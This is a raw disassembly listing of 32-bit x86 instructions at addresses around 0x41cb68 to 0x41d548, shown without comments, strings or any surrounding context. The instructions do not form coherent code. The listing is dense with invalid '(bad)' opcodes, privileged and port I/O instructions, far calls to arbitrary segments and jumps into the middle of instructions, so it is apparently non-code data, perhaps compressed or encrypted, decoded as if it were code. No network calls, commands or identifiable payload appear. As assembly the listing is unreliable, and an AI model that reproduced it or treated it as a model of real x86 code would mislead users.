  41cb68:	cmp    BYTE PTR [ebx],bl
  41cb6a:	fs pop eax
  41cb6c:	push   0xffffffba
  41cb6e:	outs   dx,DWORD PTR ds:[esi]
  41cb6f:	loop   0x41cb9a
  41cb71:	inc    esi
  41cb72:	xlat   BYTE PTR ds:[ebx]
  41cb73:	xor    DWORD PTR [edx],ecx
  41cb75:	lods   eax,DWORD PTR ds:[esi]
  41cb76:	fwait
  41cb77:	inc    edx
  41cb78:	mov    ebp,0xc46c9b9
  41cb7d:	sar    DWORD PTR [edi-0x4cebb5e2],cl
  41cb83:	out    dx,eax
  41cb84:	je     0x41cb7f
  41cb86:	jle    0x41cbbe
  41cb88:	les    edi,FWORD PTR [ebx+0x1de496e1]
  41cb8e:	addr16 mov ah,0x5d
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xb07c5322
  41cc03:	xchg   edx,eax
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0x7000001
  41cc0d:	sub    esi,DWORD PTR [ecx+0x7a95e1d2]
  41cc13:	or     al,0x56
  41cc15:	fiadd  DWORD PTR ds:0xa246c858
  41cc1b:	mov    ebp,0xfbf0a073
  41cc20:	push   cs
  41cc21:	and    eax,0x729c69e4
  41cc26:	sahf   
  41cc27:	xor    BYTE PTR [ebx],0xba
  41cc2a:	test   DWORD PTR [ebx-0x12dcc0aa],ebp
  41cc30:	shr    DWORD PTR [ebp+0x17f33864],0xa3
  41cc37:	inc    edi
  41cc38:	popf   
  41cc39:	loop   0x41cc45
  41cc3b:	sbb    eax,0xb24b71d6
  41cc40:	mov    ecx,0x92bede84
  41cc45:	sbb    eax,0x22557f19
  41cc4a:	xor    bl,bl
  41cc4c:	je     0x41cc3e
  41cc4e:	sub    DWORD PTR [edx],0x75
  41cc51:	js     0x41cc84
  41cc53:	aam    0x8f
  41cc55:	test   BYTE PTR [ecx-0x68],ah
  41cc58:	inc    eax
  41cc59:	adc    BYTE PTR [ebp-0x5f],ah
  41cc5c:	jge    0x41cc49
  41cc5e:	and    al,0x69
  41cc60:	pop    ds
  41cc61:	mov    eax,0xc7451d9a
  41cc66:	sub    al,0xd7
  41cc68:	mov    edi,0x2aade958
  41cc6d:	jbe    0x41cc30
  41cc6f:	sahf   
  41cc70:	sar    BYTE PTR [edi+ebp*2-0x1c4f5c8b],cl
  41cc77:	sub    edx,esp
  41cc79:	xchg   edx,eax
  41cc7a:	lock sub al,0x31
  41cc7d:	call   0x4a3d:0xc02b01c0
  41cc84:	sar    eax,1
  41cc86:	push   eax
  41cc87:	push   ebp
  41cc88:	mov    ebx,0x61e1a0c8
  41cc8d:	mov    ah,0xa7
  41cc8f:	loop   0x41cc6c
  41cc91:	leave  
  41cc92:	icebp  
  41cc93:	xchg   edi,eax
  41cc94:	cmp    edx,ecx
  41cc96:	push   cs
  41cc97:	aas    
  41cc98:	rcr    BYTE PTR [ebx+0x5f8a84],0xda
  41cc9f:	div    BYTE PTR [ebx+ebx*4]
  41cca2:	mov    bl,0xdd
  41cca4:	sub    eax,0xf89de0ef
  41cca9:	jmp    0x41cd16
  41ccab:	xchg   edi,eax
  41ccad:	add    ebx,DWORD PTR [ecx-0x71]
  41ccb0:	mov    ecx,0x3c53db4d
  41ccb5:	iret   
  41ccb6:	jne    0x41cceb
  41ccb8:	sbb    BYTE PTR gs:[ecx-0x3c],al
  41ccbc:	jle    0x41cd35
  41ccbe:	xor    esi,ebp
  41ccc0:	out    0x85,eax
  41ccc2:	ja     0x41ccd4
  41ccc4:	imul   ecx,DWORD PTR cs:[ebx+ecx*4],0x44fa043f
  41cccc:	pushf  
  41cccd:	jp     0x41cccc
  41cccf:	inc    edx
  41ccd0:	xor    edi,esi
  41ccd2:	pop    ebp
  41ccd3:	ins    BYTE PTR es:[edi],dx
  41ccd4:	mov    esi,0x9dda7e77
  41ccd9:	inc    edi
  41ccda:	hlt    
  41ccdb:	push   edx
  41ccdc:	fadd   QWORD PTR [edx+edi*8+0x4f]
  41cce0:	in     eax,dx
  41cce1:	add    bx,ax
  41cce4:	inc    eax
  41cce5:	cmp    BYTE PTR [edx-0x2c],dh
  41cce8:	mov    ebp,gs
  41ccea:	or     DWORD PTR [edi-0x5c],0xa2a207ac
  41ccf1:	test   al,0xfc
  41ccf3:	inc    esi
  41ccf4:	int    0x65
  41ccf6:	aas    
  41ccf7:	ret    0x5503
  41ccfa:	dec    edx
  41ccfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccfc:	and    BYTE PTR [eax+ebp*1-0x3ee077a3],dh
  41cd03:	bound  ecx,QWORD PTR [edi+0x3f379dbf]
  41cd09:	dec    esp
  41cd0a:	xor    al,0x3b
  41cd0c:	mov    esp,0x888d9b6d
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	push   ecx
  41cd81:	jns    0x41cda3
  41cd83:	and    al,0xb7
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR ds:0x69000001,al
  41cd8d:	test   DWORD PTR [eax],ecx
  41cd8f:	dec    ebx
  41cd90:	mov    esp,0x8da9b1a7
  41cd95:	jbe    0x41cd8f
  41cd97:	std    
  41cd98:	loope  0x41cdc4
  41cd9a:	xor    DWORD PTR [ecx+0xc4d6eaa],0x4a54cc32
  41cda4:	jl     0x41cd26
  41cda6:	pusha  
  41cda7:	adc    BYTE PTR [edi+0x70058d6f],dh
  41cdad:	in     eax,dx
  41cdae:	mov    BYTE PTR [ecx+0x74047bfa],bh
  41cdb4:	loope  0x41cd81
  41cdb6:	xor    eax,0x53c723f4
  41cdbb:	ins    DWORD PTR es:[edi],dx
  41cdbc:	scas   eax,DWORD PTR es:[edi]
  41cdbd:	mov    bh,dl
  41cdbf:	pop    es
  41cdc0:	xchg   BYTE PTR [ebx],dl
  41cdc2:	or     DWORD PTR [eax+esi*1+0x5e],edi
  41cdc6:	pop    ds
  41cdc7:	aad    0x1
  41cdc9:	ss sbb eax,0x186ba4e9
  41cdcf:	stos   BYTE PTR es:[edi],al
  41cdd0:	test   al,0xfa
  41cdd2:	sbb    BYTE PTR [edx-0x1b379c97],dh
  41cdd8:	xchg   esi,eax
  41cdd9:	fdivr  st(6),st
  41cddb:	add    bl,BYTE PTR [ebp+0x44]
  41cdde:	in     eax,0x7f
  41cde0:	iret   
  41cde1:	outs   dx,DWORD PTR ds:[esi]
  41cde2:	adc    BYTE PTR [edi-0x6b],bl
  41cde5:	dec    esp
  41cde6:	out    0x18,eax
  41cde8:	add    ebx,edi
  41cdea:	jno    0x41cde2
  41cdec:	mov    bh,BYTE PTR [esi]
  41cdee:	cmp    eax,DWORD PTR [esi]
  41cdf0:	rcr    BYTE PTR [ebx],cl
  41cdf2:	jl     0x41cdc8
  41cdf4:	iret   
  41cdf5:	inc    ebp
  41cdf6:	mul    BYTE PTR [ebp-0x4e]
  41cdf9:	add    DWORD PTR [ecx],ecx
  41cdfb:	and    edi,eax
  41cdfd:	jne    0x41cdfa
  41cdff:	sbb    eax,0x86fccf5e
  41ce04:	ror    DWORD PTR [esi-0x2f],0x43
  41ce08:	aad    0x91
  41ce0a:	outs   dx,BYTE PTR ds:[esi]
  41ce0b:	jmp    0x41cdfc
  41ce0d:	ss jbe 0x41cda1
  41ce10:	call   0x96cc:0x82a4d506
  41ce17:	xchg   esp,eax
  41ce18:	add    edx,eax
  41ce1a:	mov    bh,0x21
  41ce1c:	iret   
  41ce1d:	ror    esi,cl
  41ce1f:	retf   
  41ce20:	out    dx,eax
  41ce21:	lds    ebx,FWORD PTR [eax+0x1e72bc6b]
  41ce27:	mov    ds:0xe99a3e79,al
  41ce2c:	dec    ecx
  41ce2d:	adc    eax,0x7d01f97a
  41ce32:	xchg   ebx,ebx
  41ce34:	xchg   ebp,eax
  41ce35:	push   esp
  41ce36:	sbb    BYTE PTR [ebx],bl
  41ce38:	sbb    eax,0xbf432b9b
  41ce3d:	and    al,0x37
  41ce3f:	jmp    0xb62e:0x44838ced
  41ce46:	imul   ebx,DWORD PTR [edi+0x1c6f54b0],0xfffffffb
  41ce4d:	test   DWORD PTR [esi+0x71],esp
  41ce50:	sti    
  41ce51:	jne    0x41ce1f
  41ce53:	(bad)  
  41ce55:	or     BYTE PTR [ebp+0x33],ch
  41ce58:	inc    ecx
  41ce59:	push   0x96df6693
  41ce5e:	dec    edi
  41ce5f:	dec    ebp
  41ce60:	call   0xc2ab3b3a
  41ce65:	scas   eax,DWORD PTR es:[edi]
  41ce66:	(bad)  
  41ce67:	fdivr  st,st(1)
  41ce69:	add    al,0x86
  41ce6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce6c:	mov    ebx,0xafb5c019
  41ce71:	add    DWORD PTR [eax],0x75
  41ce74:	sub    dh,BYTE PTR [esi+0xd]
  41ce77:	sbb    ebp,eax
  41ce79:	sub    eax,0x9fa0cf7b
  41ce7e:	push   eax
  41ce7f:	mov    dh,0x69
  41ce81:	leave  
  41ce82:	mov    ss,WORD PTR [esi-0x5a]
  41ce85:	dec    edi
  41ce86:	and    eax,0xc8fb4c61
  41ce8b:	add    ecx,DWORD PTR [esi+0x5df0743a]
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	mov    al,ds:0xbc6ba014
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR ds:0x11000001,al
  41cf0d:	stos   DWORD PTR es:[edi],eax
  41cf0e:	clc    
  41cf0f:	mov    al,ds:0xbe263bd3
  41cf14:	jbe    0x41cf02
  41cf16:	add    eax,0x66119333
  41cf1b:	(bad)  
  41cf1c:	aad    0x48
  41cf1e:	js     0x41cea7
  41cf20:	out    0x1c,al
  41cf22:	ror    DWORD PTR [ebp+0xf],1
  41cf25:	xchg   ebx,eax
  41cf26:	scas   eax,DWORD PTR es:[edi]
  41cf27:	(bad)  
  41cf28:	sahf   
  41cf29:	push   edx
  41cf2a:	jg     0x41cedd
  41cf2c:	adc    eax,0xbdf71d70
  41cf31:	mov    eax,0x5b8927b5
  41cf36:	fst    QWORD PTR [edi-0x47]
  41cf39:	jnp    0x41cf9f
  41cf3b:	call   0xeee62b6a
  41cf40:	fisubr WORD PTR fs:[ebp+0x39]
  41cf44:	add    eax,0xbe85353d
  41cf49:	jbe    0x41cfb9
  41cf4b:	sbb    bl,BYTE PTR [eax]
  41cf4d:	jl     0x41cf6c
  41cf4f:	pop    ecx
  41cf50:	(bad)  
  41cf51:	xlat   BYTE PTR ds:[ebx]
  41cf52:	adc    esp,DWORD PTR [edi]
  41cf54:	mov    esi,0xc388701b
  41cf59:	adc    al,dh
  41cf5b:	xchg   edi,eax
  41cf5c:	cmp    ebp,DWORD PTR [ebx+0x62]
  41cf5f:	push   cs
  41cf60:	cmp    BYTE PTR [ebp-0xe],al
  41cf63:	punpckhdq mm7,mm4
  41cf66:	cmp    cl,BYTE PTR [esi+0x1bd70b5]
  41cf6c:	jle    0x41cf15
  41cf6e:	cmp    eax,0xee1aa75d
  41cf73:	cmp    bl,BYTE PTR [ebx]
  41cf75:	jg     0x41cf89
  41cf77:	dec    ebp
  41cf78:	cmp    DWORD PTR [edi+esi*2+0x4147a3c6],ebp
  41cf7f:	fdivr  DWORD PTR [edi]
  41cf81:	lods   eax,DWORD PTR gs:[esi]
  41cf83:	xchg   ebp,eax
  41cf84:	dec    ecx
  41cf85:	cld    
  41cf86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf87:	sbb    al,0x44
  41cf89:	inc    esp
  41cf8a:	xchg   ebx,eax
  41cf8b:	sbb    al,0x62
  41cf8d:	(bad)  
  41cf8e:	xchg   edi,eax
  41cf8f:	shr    dl,0xa
  41cf92:	cmp    eax,0x14efa30e
  41cf97:	lods   al,BYTE PTR ds:[esi]
  41cf98:	push   cs
  41cf99:	dec    esp
  41cf9a:	push   0x3c
  41cf9c:	push   esp
  41cf9d:	inc    ecx
  41cf9e:	test   eax,0x837bffa8
  41cfa3:	pop    esi
  41cfa4:	sbb    DWORD PTR [ebx-0x65],edi
  41cfa7:	jb     0x41cf7e
  41cfa9:	cmc    
  41cfaa:	fwait
  41cfab:	push   ds
  41cfac:	iret   
  41cfad:	adc    BYTE PTR [eax+0x3a],dh
  41cfb0:	dec    ecx
  41cfb1:	(bad)  
  41cfb2:	mov    esp,0x8f4ef6f2
  41cfb7:	push   ebx
  41cfb8:	sbb    al,0x1d
  41cfba:	mov    edi,DWORD PTR [edi]
  41cfbc:	idiv   BYTE PTR [ebp+0x36df8cc8]
  41cfc2:	loop   0x41cf8d
  41cfc4:	not    esi
  41cfc6:	dec    cx
  41cfc8:	cld    
  41cfc9:	xlat   BYTE PTR ds:[ebx]
  41cfca:	into   
  41cfcb:	sub    DWORD PTR [eax],esi
  41cfcd:	inc    ecx
  41cfce:	in     eax,dx
  41cfcf:	push   ebp
  41cfd0:	and    BYTE PTR [ebx],al
  41cfd2:	dec    ebp
  41cfd3:	(bad)  
  41cfd4:	push   esi
  41cfd5:	mov    edi,0x7f0cc5a
  41cfda:	retf   
  41cfdb:	js     0x41cf5d
  41cfdd:	cmp    al,0xb6
  41cfdf:	(bad)  
  41cfe0:	mov    eax,ds:0x9c03430e
  41cfe5:	int    0x48
  41cfe7:	bound  ebp,QWORD PTR [ebx-0x70]
  41cfea:	and    dh,cl
  41cfec:	jns    0x41cfbb
  41cfee:	mov    edi,0xba5e91ac
  41cff3:	call   0x9f27:0x9217d52a
  41cffa:	pop    eax
  41cffb:	das    
  41cffc:	in     eax,dx
  41cffd:	icebp  
  41cffe:	mov    al,ds:0xcf8262ee
  41d003:	mov    ah,0x13
  41d005:	xchg   esp,eax
  41d006:	enter  0x5e4a,0x44
  41d00a:	std    
  41d00b:	cdq    
  41d00c:	icebp  
  41d00d:	loopne 0x41d02d
  41d00f:	pop    ds
  41d010:	mov    esi,0x0
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xeab958bd
  41d083:	leave  
  41d084:	shl    DWORD PTR [ecx+eax*1],0x0
  41d088:	add    eax,0x41000001
  41d08d:	dec    ebx
  41d08e:	mov    ah,0xe5
  41d090:	dec    edi
  41d091:	and    al,BYTE PTR [ebp+0x19]
  41d094:	pop    edx
  41d095:	mov    ebx,DWORD PTR [ecx-0x66]
  41d098:	or     al,0xfb
  41d09a:	ins    BYTE PTR es:[edi],dx
  41d09b:	xlat   BYTE PTR ds:[ebx]
  41d09c:	nop
  41d09d:	mov    dl,0xfb
  41d09f:	popa   
  41d0a0:	int3   
  41d0a1:	ins    BYTE PTR es:[edi],dx
  41d0a2:	mov    DWORD PTR [ebx],ecx
  41d0a4:	and    edi,DWORD PTR [edx]
  41d0a6:	out    dx,al
  41d0a7:	imul   esi,DWORD PTR [edx+ebp*2],0xffffffd1
  41d0ab:	out    dx,eax
  41d0ac:	cmp    DWORD PTR [ebp-0x59],esp
  41d0af:	add    BYTE PTR [eax-0x1e],0xca
  41d0b3:	js     0x41d115
  41d0b5:	sub    BYTE PTR [esp+eiz*8],ch
  41d0b8:	jne    0x41d0d1
  41d0ba:	dec    ebx
  41d0bb:	inc    ecx
  41d0bc:	ja     0x41d07e
  41d0be:	je     0x41d0cb
  41d0c0:	add    eax,0xbdc42d44
  41d0c5:	mov    dh,ah
  41d0c7:	xor    BYTE PTR [ecx],cl
  41d0c9:	inc    ebp
  41d0ca:	xor    BYTE PTR [ebx+0x3a],dl
  41d0cd:	arpl   WORD PTR [esi-0x42],di
  41d0d0:	sbb    eax,0x7329ac61
  41d0d5:	fist   WORD PTR [ebp-0x27a1997a]
  41d0db:	ins    DWORD PTR es:[edi],dx
  41d0dc:	repnz fdiv DWORD PTR [ecx+0x1]
  41d0e0:	add    DWORD PTR ds:0x1170a349,ecx
  41d0e6:	sub    DWORD PTR [eax+0x43240584],eax
  41d0ec:	jo     0x41d09c
  41d0ee:	mov    ebp,0x5298987e
  41d0f3:	neg    DWORD PTR [esi]
  41d0f5:	mov    eax,ds:0xa42cb2d9
  41d0fa:	in     al,0x74
  41d0fc:	push   ecx
  41d0fd:	clc    
  41d0fe:	pusha  
  41d0ff:	fwait
  41d100:	sub    eax,0x900a3266
  41d105:	rol    ah,cl
  41d107:	fucom  st(4)
  41d109:	dec    edi
  41d10a:	daa    
  41d10b:	fmul   DWORD PTR [esi-0x4a9b1c7c]
  41d111:	in     al,dx
  41d112:	lea    ebp,[edx]
  41d114:	repz in eax,dx
  41d116:	cmp    BYTE PTR [eax+ebx*2+0x2e38dd87],ah
  41d11d:	(bad)  
  41d11f:	sub    eax,0xf10f1879
  41d124:	and    dl,BYTE PTR [ebp-0x6a]
  41d127:	repnz int3 
  41d129:	add    edx,DWORD PTR [edx]
  41d12b:	cmp    DWORD PTR ds:0xa843e85d,ebx
  41d131:	sbb    bl,BYTE PTR [edi]
  41d133:	push   esp
  41d134:	shl    DWORD PTR [eax-0x4a],0xa2
  41d138:	pop    ss
  41d139:	(bad)  
  41d13a:	out    0x46,al
  41d13c:	iret   
  41d13d:	stc    
  41d13e:	test   al,0xe6
  41d140:	mov    ebx,0x8d2d816f
  41d145:	mov    eax,DWORD PTR [edi]
  41d147:	sub    DWORD PTR [eax],edi
  41d149:	jecxz  0x41d119
  41d14b:	push   edx
  41d14c:	push   es
  41d14d:	sub    ecx,DWORD PTR [ebp-0x6ce7f7bd]
  41d153:	loope  0x41d106
  41d155:	mov    cl,0xe9
  41d157:	xor    BYTE PTR [edi+0x2f],bl
  41d15a:	in     eax,dx
  41d15b:	pop    esi
  41d15c:	and    dh,BYTE PTR [edi]
  41d15e:	lahf   
  41d15f:	xor    esp,DWORD PTR [edi+eiz*1-0x6f]
  41d163:	cmp    eax,0x906f75d4
  41d168:	inc    ebp
  41d169:	mov    ds:0xf07f9344,al
  41d16e:	mov    al,ds:0x805347cb
  41d173:	or     ecx,DWORD PTR [ebx-0x1]
  41d176:	ins    BYTE PTR es:[edi],dx
  41d177:	(bad)  
  41d178:	mov    ebp,0x3a027ff1
  41d17d:	or     BYTE PTR [esp+eiz*4-0x2c],ah
  41d181:	and    ebx,DWORD PTR [ebp-0x339eee]
  41d187:	ins    DWORD PTR es:[edi],dx
  41d188:	mov    esi,0x4fc81191
  41d18d:	aaa    
  41d18e:	call   0x0:0x2a11
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	std    
  41d201:	pusha  
  41d202:	sar    BYTE PTR [edi-0x3a],1
  41d205:	xor    eax,0x1050001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	not    BYTE PTR [esi+0x48]
  41d20f:	jle    0x41d269
  41d211:	xor    cl,BYTE PTR [bx+si]
  41d214:	and    al,0x90
  41d216:	jmp    0xa627a247
  41d21b:	xchg   edi,eax
  41d21c:	push   edi
  41d21d:	shl    DWORD PTR [ebx+ecx*8-0x5a],1
  41d221:	add    eax,0xc5ef11ce
  41d226:	lods   eax,DWORD PTR ds:[esi]
  41d227:	sbb    edx,ebx
  41d229:	hlt    
  41d22a:	(bad)  
  41d22b:	shr    BYTE PTR [ebp+eiz*4-0x327d5ee9],cl
  41d232:	aad    0x3d
  41d234:	in     eax,dx
  41d235:	xchg   esi,eax
  41d236:	jae    0x41d23b
  41d238:	inc    ebp
  41d239:	cmp    bl,BYTE PTR [eax+eax*2+0x32cdf3a9]
  41d240:	xor    ah,BYTE PTR [esi-0x29fa9584]
  41d246:	jge    0x41d1df
  41d248:	das    
  41d249:	mov    edx,0x8ea75e03
  41d24e:	in     eax,dx
  41d24f:	jge    0x41d269
  41d251:	pop    edx
  41d252:	xchg   ecx,eax
  41d253:	lea    esi,[eax]
  41d255:	iret   
  41d256:	pop    ds
  41d257:	adc    bl,0xf1
  41d25a:	loope  0x41d2a7
  41d25c:	add    ebp,DWORD PTR [ecx-0x2a33af68]
  41d262:	mov    BYTE PTR [edx+0x4708bb76],cl
  41d268:	es mul ebp
  41d26b:	or     DWORD PTR [eax],0x48e8852c
  41d271:	or     BYTE PTR [edi+0x458b46ca],0x92
  41d278:	ret    0x9948
  41d27b:	lods   al,BYTE PTR ds:[esi]
  41d27c:	mov    ch,BYTE PTR [ebx]
  41d27e:	and    eax,DWORD PTR [edx]
  41d280:	lahf   
  41d281:	adc    BYTE PTR [esi+0x12],0xd4
  41d285:	inc    esp
  41d286:	xchg   ebx,eax
  41d287:	push   ebp
  41d288:	xchg   ecx,eax
  41d289:	jns    0x41d2a8
  41d28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d28c:	xchg   ebp,eax
  41d28d:	cdq    
  41d28e:	fs jmp 0xbb319959
  41d294:	test   DWORD PTR [ebx],esp
  41d296:	(bad)  
  41d297:	outs   dx,BYTE PTR ds:[esi]
  41d298:	jecxz  0x41d268
  41d29a:	or     dl,ch
  41d29c:	stos   DWORD PTR es:[edi],eax
  41d29d:	mov    ebp,gs
  41d29f:	fucomp st(7)
  41d2a1:	jbe    0x41d288
  41d2a3:	mov    ecx,0xed382be5
  41d2a8:	faddp  st(0),st
  41d2aa:	ins    BYTE PTR es:[edi],dx
  41d2ab:	inc    ebx
  41d2ac:	dec    ecx
  41d2ad:	ins    BYTE PTR es:[edi],dx
  41d2ae:	and    al,0x7f
  41d2b0:	jnp    0x41d320
  41d2b2:	fwait
  41d2b3:	out    dx,eax
  41d2b4:	jns    0x41d2c5
  41d2b6:	lock xchg BYTE PTR [esi],cl
  41d2b9:	mov    ecx,0x29df58eb
  41d2be:	inc    edx
  41d2bf:	xchg   edi,eax
  41d2c0:	sub    edx,DWORD PTR [ecx+esi*8+0x282b2c09]
  41d2c7:	(bad)  
  41d2c8:	es into 
  41d2ca:	and    esi,DWORD PTR [eax+0x24]
  41d2cd:	pop    ebx
  41d2ce:	arpl   WORD PTR [edx],bp
  41d2d0:	sbb    al,0x9
  41d2d2:	aas    
  41d2d3:	cdq    
  41d2d4:	push   eax
  41d2d5:	xchg   ebx,eax
  41d2d6:	mov    edx,DWORD PTR [ebx-0x7b1da4ad]
  41d2dc:	clc    
  41d2dd:	add    cl,0x70
  41d2e0:	arpl   WORD PTR [ecx+0x3094fd6a],bx
  41d2e6:	popw   ds
  41d2e8:	push   ebp
  41d2e9:	xor    DWORD PTR [ecx+ebx*2-0x52],ecx
  41d2ed:	shr    DWORD PTR [eax-0x45b33a16],0xb6
  41d2f4:	cld    
  41d2f5:	int    0x65
  41d2f7:	(bad)  
  41d2f8:	jp     0x41d2d1
  41d2fa:	out    dx,al
  41d2fb:	xchg   BYTE PTR [ebx+0x54],bh
  41d2fe:	mov    ch,0xdc
  41d300:	xlat   BYTE PTR ds:[ebx]
  41d301:	cmp    ecx,DWORD PTR [edx+edx*8]
  41d304:	arpl   WORD PTR [edi+0x4a],si
  41d307:	dec    eax
  41d308:	je     0x41d2e6
  41d30a:	cmp    esi,DWORD PTR [edx-0x668cb56d]
  41d310:	or     eax,DWORD PTR [eax]
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	lahf   
  41d381:	inc    esi
  41d382:	add    ah,cl
  41d384:	retf   
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x2000001
  41d38d:	xchg   ebp,eax
  41d38e:	push   0x3d28ad9e
  41d393:	adc    al,0x2a
  41d395:	sub    eax,0x92d74d49
  41d39a:	stos   BYTE PTR es:[edi],al
  41d39b:	daa    
  41d39c:	mov    eax,0x1fc7555c
  41d3a1:	mov    bl,0x62
  41d3a3:	push   edx
  41d3a4:	cld    
  41d3a5:	inc    ebp
  41d3a6:	add    ebp,DWORD PTR [edi+0x3929519e]
  41d3ac:	mov    edi,0xf80d6ed0
  41d3b1:	jge    0x41d33a
  41d3b3:	inc    ebx
  41d3b4:	inc    eax
  41d3b5:	lahf   
  41d3b6:	mov    cl,BYTE PTR [esi*2-0x74d000c7]
  41d3bd:	pop    esp
  41d3be:	or     eax,0x5fa1c42a
  41d3c3:	xor    eax,0xd2b2ec63
  41d3c8:	pusha  
  41d3c9:	pop    esp
  41d3ca:	add    bh,BYTE PTR [eax-0x65]
  41d3cd:	sub    ebp,DWORD PTR [esi-0x1af1a291]
  41d3d3:	jns    0x41d38a
  41d3d5:	or     BYTE PTR [ecx-0x70],ch
  41d3d8:	mov    ds:0x710691c5,eax
  41d3dd:	mov    esi,0xc4ffd4b2
  41d3e2:	out    0x2e,eax
  41d3e4:	scas   eax,DWORD PTR es:[edi]
  41d3e5:	loopne 0x41d3a2
  41d3e7:	outs   dx,DWORD PTR ds:[esi]
  41d3e8:	test   al,0x7f
  41d3ea:	fs or  al,0x9c
  41d3ed:	push   edx
  41d3ee:	or     ah,BYTE PTR [esi+0x60]
  41d3f1:	mov    dh,0xf9
  41d3f3:	mov    ?,WORD PTR [edi+0x23]
  41d3f6:	ss (bad) 
  41d3f8:	test   al,0x86
  41d3fa:	es (bad) 
  41d3fc:	sub    bh,BYTE PTR [edx+esi*4+0x34]
  41d400:	jnp    0x41d468
  41d402:	mov    esp,0x21688470
  41d407:	or     esp,edx
  41d409:	pop    ebx
  41d40a:	dec    eax
  41d40b:	dec    ebp
  41d40c:	pop    ss
  41d40d:	cs shl dh,1
  41d410:	xor    al,0x8
  41d412:	cs in  al,dx
  41d414:	jo     0x41d404
  41d416:	mov    ch,0x65
  41d418:	cli    
  41d419:	push   0xffffff8a
  41d41b:	xor    cl,BYTE PTR [edx-0x27fb89e6]
  41d421:	xor    esi,DWORD PTR [eax+0x73]
  41d424:	call   0x6049:0x999295fc
  41d42b:	(bad)  
  41d42c:	(bad)  
  41d42d:	sbb    dl,BYTE PTR [edi+0x347b8cd1]
  41d433:	inc    eax
  41d434:	adc    esp,edi
  41d436:	sahf   
  41d437:	xor    eax,0xe92b6463
  41d43c:	dec    ebx
  41d43d:	inc    ecx
  41d43e:	loop   0x41d480
  41d440:	mov    dh,0x8b
  41d442:	ret    
  41d443:	ins    BYTE PTR es:[edi],dx
  41d444:	popf   
  41d445:	lods   al,BYTE PTR ds:[esi]
  41d446:	rcr    BYTE PTR [ecx+eax*4+0x3],0x40
  41d44b:	sahf   
  41d44c:	and    eax,0x8e028b2c
  41d451:	xchg   DWORD PTR [esi-0x54efddaf],edi
  41d457:	push   es
  41d458:	dec    esp
  41d459:	pop    eax
  41d45a:	xor    al,0xaa
  41d45c:	dec    edx
  41d45d:	xchg   ebx,eax
  41d45e:	mov    ah,0xe0
  41d460:	cmp    eax,0xd1c3a558
  41d465:	add    bl,bh
  41d467:	cmp    eax,0x4b789de8
  41d46c:	dec    ebp
  41d46d:	stos   DWORD PTR es:[edi],eax
  41d46e:	adc    edi,DWORD PTR [ebp+0x173907b0]
  41d474:	push   esp
  41d475:	pop    ecx
  41d476:	and    ebx,DWORD PTR [esi]
  41d478:	dec    esp
  41d479:	add    al,BYTE PTR [edx-0x71]
  41d47c:	shl    DWORD PTR ds:[edx-0x1f6f8faf],1
  41d483:	jmp    0x52b73c02
  41d488:	js     0x41d4bd
  41d48a:	xchg   ebx,eax
  41d48b:	push   0x4a
  41d48d:	imul   ebp,DWORD PTR [ebp+0xe],0xffffffb9
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd04d:0xa3d73289
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0x13000001
  41d50d:	xor    ch,al
  41d50f:	xchg   edi,eax
  41d510:	jle    0x41d53b
  41d512:	jb     0x41d523
  41d514:	pusha  
  41d515:	es int 0x9b
  41d518:	ds out 0x14,al
  41d51b:	push   cs
  41d51c:	inc    esp
  41d51d:	retf   0x84f8
  41d520:	add    al,0x2d
  41d522:	jb     0x41d547
  41d524:	sub    bl,BYTE PTR [ecx+0x6d6a6f56]
  41d52a:	pop    ss
  41d52b:	(bad)  
  41d52c:	xchg   DWORD PTR [ebx],ecx
  41d52e:	cmp    cl,BYTE PTR [ebp+ecx*2+0x50]
  41d532:	xlat   BYTE PTR ds:[ebx]
  41d533:	dec    esp
  41d534:	mov    DWORD PTR [esi+esi*2+0x17],esp
  41d538:	xor    al,BYTE PTR [esp+edi*2-0x66]
  41d53c:	sbb    ebx,ebp
  41d53e:	inc    ecx
  41d53f:	ss (bad) 
  41d541:	xor    DWORD PTR [eax+0x2b28b93d],edx
  41d547:	sahf   
  41d548:	movaps XMMWORD PTR [ecx-0x55],xmm7
